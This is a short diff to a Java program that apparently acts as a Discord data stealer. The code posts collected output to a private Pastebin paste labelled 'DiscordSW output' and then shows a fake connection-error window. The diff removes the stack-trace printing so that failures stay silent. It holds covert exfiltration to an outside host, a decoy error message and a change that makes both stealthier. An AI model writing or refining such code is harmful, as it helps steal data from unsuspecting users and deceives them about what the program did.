@@ -28,7 +28,6 @@ public class Main {
             PastebinLink link = PastebinManager.postPrivate("DiscordSW output", builder.toString());
         }
         catch (Exception e) {
-            e.printStackTrace();
         }
         ErrorWindow.run("Error when establishing connection, code:0003");
     }
